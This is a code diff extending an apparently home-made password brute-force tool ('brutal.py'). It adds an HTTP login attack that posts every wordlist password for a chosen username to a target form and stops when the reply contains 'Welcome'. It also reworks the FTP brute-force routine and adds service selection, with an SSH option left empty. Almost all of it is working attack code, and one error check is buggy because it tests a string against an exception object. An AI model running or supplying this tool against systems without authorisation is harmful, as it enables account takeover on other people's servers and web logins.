@@ -1,4 +1,5 @@
 import ftplib
+import requests
 import os, sys, time
 
 # ANSI codes for font colors
@@ -20,8 +21,11 @@ def ftpBruteForce(IP, wordlist):
         credentials.append("anonymous:''")
         ftp.quit()
     except Exception as e:
-        print(f"[{colors.RED}-{colors.RESET}] Anonymous login not allowed on {IP}!\n")
-        print(e)
+        if('service not known' in e):
+            print(f"[{colors.RED}-{colors.RESET}] This host probably seems to be down or doesn't exist!")
+            exit()
+        else:
+            print(f"[{colors.RED}-{colors.RESET}] Anonymous login not allowed on {IP}!\n")
 
     # Starting brute-force attack
     f = open(wordlist, 'r')
@@ -49,6 +53,22 @@ def ftpBruteForce(IP, wordlist):
     else:
         print(f"\n[{colors.RED}-{colors.RESET}] No credentials found in this list!")
 
+def httpBruteForce(url, username, wordlist):
+    f = open(wordlist, 'r')
+    for word in f.readlines():
+        word = word.strip('\n')
+        data = {
+            "username":username,
+            "password":word,
+            "Login":"Login"
+        }
+        r = requests.post(url, data=data)
+        #print(r.text)
+        if 'Welcome' in r.text:
+            print(f"\n[{colors.GREEN}+{colors.RESET}] Login successful using {username}:{word}\n")
+            break
+        else:
+            print(f"[{colors.RED}-{colors.RESET}] Login failed using {username}:{word}")
 
 def main():
     try:
@@ -62,10 +82,32 @@ def main():
             except OSError as e:
                 print(f"[{colors.RED}-{colors.RESET}] {e}")
                 exit()
-            print(f"Target locked: {colors.YELLOW}{target}{colors.RESET}\n")
-            print("Initiating attack...\n")
-            time.sleep(3)
-            ftpBruteForce(target, wordlist)
+            
+            services = ['ftp','ssh','http']
+            service = sys.argv[3]
+            if service in services:
+                if(service == 'ftp'):
+                    print(f"Target locked: {colors.YELLOW}{target}{colors.RESET}\n")
+                    print("Initiating attack...\n")
+                    time.sleep(3)
+                    ftpBruteForce(target, wordlist)
+                elif(service == 'ssh'):
+                    pass
+                elif(service == 'http'):
+                    url = input("Enter the target URL: ")
+                    url_req = 'http://'
+                    if(url_req in url):
+                        username = input("Enter the username: ")
+                        print(f"Target locked: {colors.YELLOW}{url}{colors.RESET}\n")
+                        print("Initiating attack...\n")
+                        time.sleep(3)
+                        httpBruteForce(url, username, wordlist)
+                    else:
+                        print(f"[{colors.RED}-{colors.RESET}] Incorrect URL")
+                    pass
+            else:
+                print("[-] Attack only possible on ftp, ssh and http services")
+                print("INPUT FORMAT: python3 brutal.py <TARGET IP> <WORDLIST> <ftp or ssh or http>")    
         else:
             print(f"[{colors.RED}-{colors.RESET}] Incorrect IP address")
             print("INPUT FORMAT: python3 brutal.py <TARGET IP> <WORDLIST> <ftp or ssh or http>")
